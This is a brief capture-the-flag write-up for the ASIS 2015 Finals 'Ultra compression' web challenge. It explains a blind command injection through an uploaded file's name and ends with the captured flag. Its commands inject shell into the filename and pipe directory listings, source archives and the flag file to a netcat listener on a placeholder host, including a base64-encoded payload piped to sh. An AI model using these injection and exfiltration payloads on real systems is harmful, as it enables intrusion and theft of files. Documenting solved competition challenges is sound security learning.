---
layout: post
title: "ASIS 2015 Finals: Ultra compression"
modified: 2015-10-15
tags: asis asis2015finals web
---

*This challenge was solved by and the write up was written by teammates, nguyen and akg*

Through testing to know it's a blind cmd injection in filename of a file upload.

Set a host listen to a port and inject a cmd, ex: ```filename.txt; ls |nc ip port```

To copy the source, ```find .. -iname '*gz'|xargs cat|nc ip port```, analyze it, we have expl:

{% highlight text %}
~  echo "cat /home/asis/flag.txt | nc ip port" | base64
<base64string>
~ a.txt| echo <base64string> | base64 -d | sh
{% endhighlight %}

{% highlight text %}
ASIS{72a126946e40f67a04d926dd4786ff15}
{% endhighlight %}